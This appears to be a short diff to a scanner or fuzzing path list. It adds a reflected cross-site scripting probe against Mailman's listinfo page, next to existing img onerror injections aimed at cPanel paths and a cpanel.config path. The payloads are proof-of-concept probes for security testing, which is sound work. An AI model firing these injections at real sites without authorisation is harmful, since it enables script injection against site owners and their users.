@@ -1,3 +1,4 @@
 /cpanelwebcall/<img%20src=x%20onerror=
 /cpanelwebcall/<><img%20src=x%20onerror=
 /cpanel.config
+/mailman/listinfo?mpidentity=%3C/script%3E%3Csvg/onload=alert(document.domain)%3E
